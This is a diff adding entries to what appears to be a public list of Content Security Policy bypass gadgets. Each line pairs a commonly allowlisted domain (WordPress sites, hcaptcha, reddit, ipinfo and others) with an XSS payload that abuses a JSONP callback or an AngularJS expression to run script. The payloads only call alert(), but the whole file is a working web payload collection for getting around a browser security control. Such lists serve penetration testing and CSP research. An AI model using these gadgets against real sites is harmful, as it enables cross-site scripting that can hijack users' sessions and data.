@@ -281,9 +281,18 @@ wildapricot.com	<script src="https://wildapricot.com/wp-json?_jsonp=alert"></scr
 wordpress.org	<script src="https://wordpress.org/wp-json/wp/v2/posts/?_jsonp=alert"></script>
 wse.api.here.com	<script src="https://wse.api.here.com/v8/findsequence2?apiKey=<valid-api-key-here>&jsonCallback=alert(origin);void&mode=TransportModes"></script>
 www-api.ibm.com	<script src="https://www-api.ibm.com/search/typeahead/v1?lang=en&cc=us&query=l&callback=alert"></script>
+www.abtasty.com <script src="https://www.abtasty.com/wp-json?_jsonp=alert"></script>
+www.adpushup.com        <script src="https://www.adpushup.com/wp-json?_jsonp=alert"></script>
+www.altmetric.com       <script src="https://www.altmetric.com/wp-json?_jsonp=alert"></script>
 www.ancestrycdn.com	<body ng-app ng-csp><script src="https://www.ancestrycdn.com/ui-static/lib/angular/1.2.3/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+www.appointlet.com      <script src="https://www.appointlet.com/wp-json?_jsonp=alert"></script>
+www.bazaarvoice.com     <script src="https://www.bazaarvoice.com/wp-json?_jsonp=alert"></script>
 www.bing.com	<script src="https://www.bing.com/api/maps/mapcontrol?key=AlSfV3wSTlPFqxEdS97v1d1ZK25Qg4OxZerOAjFYQPZwtY4bQqhz4jDRou_kCmbJ&callback=alert"></script>
 www.blogger.com	<script src="https://www.blogger.com/feeds/8063678697117239807/posts/default?callback=alert"></script>
+www.cookiebot.com       <script src="https://www.cookiebot.com/wp-json?_jsonp=alert"></script>
+www.criteo.com  <script src="https://www.criteo.com/wp-json?_jsonp=alert"></script>
+www.demandbase.com      <script src="https://www.demandbase.com/wp-json?_jsonp=alert"></script>
+www.ecwid.com   <script src="https://www.ecwid.com/wp-json?_jsonp=alert"></script>
 www.google-analytics.com	<script src="https://www.google-analytics.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
 www.google.com	<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>
 www.google.com	<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
@@ -293,12 +302,25 @@ www.googleapis.com	<script src="https://www.googleapis.com/customsearch/v1?callb
 www.googletagmanager.com	<script src="https://www.googletagmanager.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
 www.gstatic.com	<body ng-app ng-csp><script src="//www.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 www.gstatic.com	<script src='https://www.gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
+www.hcaptcha.com        <script src="https://www.hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>
+www.indexexchange.com   <script src="https://www.indexexchange.com/wp-json?_jsonp=alert"></script>
+www.ipinfo.io   <script src="https://www.ipinfo.io/?format=jsonp&callback=alert"></script>
 www.meteoprog.ua	<script src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>
 www.microsoft.com	<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert"></script>
+www.microsoft.com       <script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert"></script>
 www.paypal.com	<script src="https://www.paypal.com/checkoutnow/remembered?callback=alert"></script>
+www.paytr.com   <script src="https://www.paytr.com/wp-json?_jsonp=alert"></script>
+www.readspeaker.com     <script src="https://www.readspeaker.com/wp-json?_jsonp=alert"></script>
 www.recaptcha.net	<script src="https://www.recaptcha.net/recaptcha/api.js?onload=alert"></script>
 www.reddit.com	<script src="https://www.reddit.com/.json?limit=1&jsonp=alert"></script>
+www.reddit.com  <script src="https://www.reddit.com/.json?jsonp=alert"></script>
+www.reklamstore.com     <script src="https://www.reklamstore.com/wp-json?_jsonp=alert"></script>
+www.sanalofisonline.com <script src="https://www.sanalofisonline.com/wp-json?_jsonp=alert"></script>
+www.sovrn.com   <script src="https://www.sovrn.com/wp-json?_jsonp=alert"></script>
 www.st.com	<body ng-app ng-csp><script src="https://www.st.com/etc/clientlibs/st-search-cx/stangularjs.min.d9f5c8180af41b5cae710870b6b018fe.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+www.thebrave.io <script src="https://www.thebrave.io/wp-json?_jsonp=alert"></script>
+www.vidyome.com <script src="https://www.vidyome.com/wp-json?_jsonp=alert"></script>
+www.wildapricot.com     <script src="https://www.wildapricot.com/wp-json?_jsonp=alert"></script>
 www.yastat.net	<script src="https://www.yastat.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 www.yastatic.net	<script src="https://www.yastatic.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 www.youtube.com	<script src="https://www.youtube.com/oembed?callback=alert(1)"></script>
